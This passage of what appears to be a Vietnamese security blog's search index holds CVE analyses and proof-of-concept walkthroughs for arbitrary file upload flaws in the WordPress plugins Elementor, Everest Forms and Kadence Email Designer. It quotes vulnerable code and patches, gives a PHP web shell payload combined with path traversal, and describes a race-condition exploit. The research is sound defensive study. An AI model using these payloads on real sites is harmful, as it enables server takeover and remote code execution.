$allowed_file_extensions ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) { $file_extension = pathinfo( $file['fileName'], PATHINFO_EXTENSION ); $is_file_type_allowed = $this-\u003eis_file_type_allowed( $file_extension, $allowed_file_extensions ); if ( is_wp_error( $is_file_type_allowed ) ) { return $is_file_type_allowed; } $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Code Analysis\rQuá trình upload template có nội dung ở dạng Base64 được xử lý như sau: dữ liệu trong $file['fileData'] được giải mã bằng base64_decode và gán vào biến $file_content: $file_content = base64_decode( $file['fileData'] ); Sau khi giải mã, hàm save_base64_to_tmp_file() sẽ gọi đến create_temp_file() để lưu nội dung này thành file template trên server: public function create_temp_file( $file_content, $file_name ) { $temp_filename = $this-\u003ecreate_unique_dir() . $file_name; file_put_contents( $temp_filename, $file_content ); // phpcs:ignore return $temp_filename; } Đường dẫn lưu file được tạo bằng cách nối $file_name với kết quả trả về từ create_unique_dir() - hàm này tạo đường dẫn lưu trữ template tạm thời: public function create_unique_dir() { $unique_dir_path = $this-\u003eget_temp_dir() . uniqid() . DIRECTORY_SEPARATOR; wp_mkdir_p( $unique_dir_path ); return $unique_dir_path; } Hàm create_unique_dir() chịu trách nhiệm tạo thư mục chứa template tạm thời, có dạng: wp-content/uploads/elementor/tmp/\u003cfilename\u003e Trong đó, \u003cuniqueId\u003e được sinh tự động bằng uniqid() để đảm bảo đường dẫn không trùng lặp. wp_mkdir_p() sẽ tạo thư mục vật lý trên server để lưu trữ template này. Cuối cùng create_temp_file() sẽ gọi đến file_put_contents( $temp_filename, $file_content ) để lưu trữ nội dung của $file_content vào $temp_filename Lỗi\rTận dùng việc không sanitize file name ở đây, ta kết hợp tấn công path travesal để file được lưu ở vị trí có thể truy cập được, vượt qua được tính chất ngẫu nhiên của uniqid() public function import_template( array $data ) { // If the template is a JSON file, allow uploading it. add_filter( 'elementor/files/allow-file-type/json', [ $this, 'enable_json_template_upload' ] ); add_filter( 'elementor/files/allow_unfiltered_upload', [ $this, 'enable_json_template_upload' ] ); // Imported templates can be either JSON files, or Zip files containing multiple JSON files $upload_result = Plugin::$instance-\u003euploads_manager-\u003ehandle_elementor_upload( $data, [ 'zip', 'json' ] ); ... } handle_elementor_upload() được gọi trong import_template(). Theo như comment của developer thì nếu template là JSON file thì được phép upload, ta đặt debug và thực hiện upload JSON template: Tạo post bằng Elementor Click vào folder icon Vị trí folder icon\rClick vào upload icon Vị trí upload icon\rGiao diện upload\rChọn JSON file và upload Debuger nhảy tới import_template sau khi upload JSON file\r","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#code-analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\r","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo JSON file chứa web shell PHP \u003c?php system($_REQUEST[\"cmd\"])?\u003e Upload và bắt request bằng BurpSuite Sửa đổi file extension thành PHP kết hợp path traversal và gửi request Request với path traversal và .php\rKết quả RCE với file upload\r","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2023-48777 cho phép người dùng có quyền Contributor tải lên các file độc hại do thiếu kiểm tra loại file trước khi lưu trữ. Điều này có thể dẫn đến Arbitrary File Upload và Remote Code Execution (RCE) nếu máy chủ cho phép thực thi file upload. Lỗi đã được vá trong phiên bản 3.18.2 bằng cách bổ sung kiểm tra phần mở rộng file hợp lệ trước khi ghi ra đĩa. ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rLuôn xác thực loại file trước khi lưu. Không tin tưởng dữ liệu Base64 hoặc tên file từ client. Giới hạn quyền upload và tách biệt thư mục lưu file khỏi vùng thực thi mã. ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin \u003c= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Everest Forms – Contact Forms, Quiz, Survey, Newsletter \u0026 Payment Form Builder cho WordPress dễ bị tấn công arbitrary file upload, read, and deletion do thiếu file type và path validation trong phương thức format của class EVF_Form_Fields_Upload ở tất cả các phiên bản đến và bao gồm 3.0.9.4. Điều này cho phép unauthenticated attackers có thể upload, read, và delete arbitrary files trên server của site bị ảnh hưởng, dẫn đến khả năng remote code execution, sensitive information disclosure, hoặc site takeover. CVE ID: CVE-2025-1128 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.0.9.4 Patched Versions: 3.0.9.5 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.0.9.4 – vulnerable 3.0.9.5 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng này do việc kiểm tra kiểu tệp và đường dẫn tệp chưa đủ nghiêm ngặt trong hàm format của lớp EVF _Form_Fields_Upload. Ngay cả khi tệp có định dạng không hợp lệ, quá trình tải lên vẫn có thể thành công, nên bằng cách sửa một vài nội dung trong dữ liệu/giao tiếp gửi lên, có thể né được việc xác thực phía máy chủ. public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } ... // upload file handler } Hàm wp_check_filetype_and_ext() sẽ trả về $ext và $type rỗng nếu file upload không hợp lệ (không nằm trong whilelist của WordPress). Sau khi dòng 8-9 được thực thi, không có cơ chế nào để dừng chương trình khiến chương trình tiếp tục thực thi upload file. Bản vá đã thực hiện điều này bằng cách gọi hàm wp_die() public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); wp_die( 'File type is not allowed' ); } ... // upload file handler } ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Code Analysis\rpublic function format( $field_id, $field_submit, $form_data, $meta_key ) { // Setup class properties to reuse everywhere. $this-\u003eform_data = (array) $form_data; $this-\u003eform_id = absint( $this-\u003eform_data['id'] ); $this-\u003efield_id = $field_id; $this-\u003efield_data = $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]; $field_label = ! empty( $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] ) ? $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] : ''; $input_name = sprintf( 'everest_forms_%d_%s', $this-\u003eform_id, $this-\u003efield_id ); // Make sure json_decode() doesn't fail on newer PHP. try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } // Make sure we process only submitted files with the expected structure and keys. $files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); if ( empty( $files ) ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $data = array(); foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } // Allow third-party integrations. if ( has_filter( 'everest_forms_integration_uploads' ) ) { $file = apply_filters( 'everest_forms_integration_uploads', $file, $this-\u003eform_data ); } if ( $this-\u003eis_media_integrated() ) { $file['path'] = $file['tmp_path']; $file = $this-\u003egenerate_file_attachment( $file ); } elseif ( ! isset( $file['external'] ) \u0026\u0026 file_exists( $file['tmp_path'] ) ) { $this-\u003ecreate_dir( dirname( $file['path'] ) ); @rename( $file['tmp_path'] , $file['path'] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged $this-\u003eset_file_fs_permissions( $file['path'] ); } $data[] = $this-\u003egenerate_file_data( $file ); } ... } Plugin này được tạo ra nhằm mục địch tạo form template và sử dụng chúng trong post/page. Vì lỗ hổng liên quan đến việc upload file, nên ta tạo form với field File Upload và nhúng nó vào post Tạo form với field **File Upload**\rUpload file file bất kì và bắt lại bằng BurpSuite (Việc upload file cũng dành cho anonymous user khi truy cập post/page được nhúng form) Bắt request fileupload bằng BurpSuite\rĐặt break point đến hàm format() và quan sát $input_name trong debugger\rTheo kết quả debug $input_name là tên trường ánh xạ đến mảng chứa JSON data file và name Dữ liệu này được decode JSON và gán cho mảng $raw_files try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $raw_files trong debugger\r$files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); Filter này trả về dữ liệu gán vào mảng $files, đảm bảo chỉ xử lý các tệp được gửi có cấu trúc và khóa mong đợi, nếu lỗi sẽ trả về rỗng. $files trong debugger\rDuyệt mảng file, plugin gọi đến hàm generate_file_info() để tạo thông tin tạm cho mỗi file, sau đó mới kiểm tra loại file bằng wp_check_filetype_and_ext(). foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); ... } protected function gen","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#code-analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\r","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo file .txt chứa code php TEXT \u003c?php phpinfo();?\u003e Bật Burp Intercept và bắt file upload Sửa extension trong name thành .php và gửi request. File upload thành công\rTruy cập file đã upload phpinfo() với file upload\r","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng trong EVF_Form_Fields_Upload::format() cho phép tải lên, đọc và xóa tệp tùy ý do thiếu kiểm tra kiểu tệp và đường dẫn đúng cách. Mặc dù plugin có cảnh báo lỗi khi phát hiện tệp không hợp lệ, luồng xử lý không dừng và vẫn gọi rename() để di chuyển tệp vào thư mục public — dẫn đến khả năng đưa mã thực thi lên server (RCE), tiết lộ dữ liệu nhạy cảm hoặc chiếm quyền quản trị site. Bản vá (≥ 3.0.9.5) đã khắc phục bằng cách dừng luồng khi phát hiện tệp không hợp lệ, nhưng các site chưa cập nhật vẫn rất dễ bị lợi dụng. ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rThiếu kiểm tra chặt chẽ kiểu/đuôi file dẫn đến nguy cơ upload file thực thi. Phát hiện file không hợp lệ nhưng không dừng luồng xử lý cho phép kẻ tấn công bypass. Validation vô nghĩa nếu không kèm hành động chặn (stop/exit/wp_die) trước khi thao tác filesystem. Cần kiểm tra cả nội dung (MIME/content), không chỉ dựa vào tên/extension do client cung cấp. Ngăn thực thi PHP trong thư mục uploads và dùng API upload an toàn (ví dụ wp_handle_upload()). ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress Everest Forms Plugin \u003c= 3.0.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Kadence WooCommerce Email Designer Plugin.","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Arbitrary File Upload trong Ben Ritner - Kadence WP Kadence WooCommerce Email Designer cho phép Upload một Web Shell lên Web Server. Vấn đề này ảnh hưởng đến Kadence WooCommerce Email Designer từ phiên bản không xác định cho đến 1.5.14. CVE ID: CVE-2025-39557 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.5.14 Patched Versions: 1.5.15 CVSS severity: Low (9.1) Required Privilege: Administrator Product: WordPress Kadence WooCommerce Email Designer Plugin ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Kadence WooCommerce Email Designer: 1.5.14 (vulnerable) và 1.5.15 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. WooCommerce Plugin ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rstatic private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } Trong phiên bản lỗi, hàm import_woomail() gọi đến wp_handle_upload() để upload file vào thư mục upload chính thức của WordPress (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/) Lỗi\rTuy nhiên, tùy chọn test_type =\u003e false khiến WordPress bỏ qua việc kiểm tra MIME Type dựa trên whitelist hợp lệ. Điều này cho phép kẻ tấn công upload các tệp nguy hiểm như web shell .php lên máy chủ. static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e true, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } Bản vá đã thay đổi tùy chọn 'test_type' =\u003e true nên kích hoạt kiểm tra MIME theo whitelist, ngăn upload tệp nguy hiểm như web shell .php. ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rstatic private function import_woomail( $wp_customize ) { // Make sure we have a valid nonce. if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } // Make sure WordPress upload support is loaded. if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } // Load the export/import option class. require_once KT_WOOMAIL_PATH . 'includes/class-kadence-woomail-import-option.php'; // Setup global vars. global $wp_customize; global $kt_woomail_import_error; // Setup internal vars. $kt_woomail_import_error = false; $template = 'kadence-woomail-designer'; $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); // Make sure we have an uploaded file. if ( isset( $file['error'] ) ) { $kt_woomail_import_error = $file['error']; return; } if ( ! file_exists( $file['file'] ) ) { $kt_woomail_import_error = __( 'Error importing settings! Please try again.', 'kadence-woocommerce-email-designer' ); return; } // Get the upload data. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); // Check for support of older export files. Will remove later. if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } // Remove the uploaded file. unlink( $file['file'] ); ... exit; } Hàm import_woomail() có nhiệm vụ xử lý tải lên và nhập dữ liệu cấu hình cho plugin Kadence WooCommerce Email Designer, cụ thể: Kiểm tra nonce để đảm bảo yêu cầu hợp lệ, tránh CSRF attack: if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } Khi search với từ khóa kt-woomail-import trong thư mục plugin Cách nonce được tạo\rNonce được tạo với name là kt-woomail-import, tức nonce được đặt trong mã nguồn trả về khi sử dụng chức năng của plugin, ta sử dụng chức năng này và lấy nonce Cách lấy nonce trong mã nguồn trả về\rThực hiện upload file bằng wp_handle_upload() $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); Như phân tích ở trên, do triển khai lỗi nên hàm này chấp nhận upload .php Đọc nội dung file upload, thử parse dưới dạng JSON. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); Nếu không phải JSON hợp lệ → thử giải mã base64 rồi unserialize() if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } Xóa file upload khỏi server unlink( $file['file'] ); Ta cần quan tâm các phần sau: graph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rFile bị xóa ngay sau khi upload, nên không thể truy cập theo cách thông thường. Tận dụng khoảng thời gian giữa Upload File và unlink() để gọi file vừa upload trong khoảng thời gian đó nhằm thực thi web shell. Ta sử dụng kỹ thuật File Upload + Race Condition static public function import_export_reques","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e 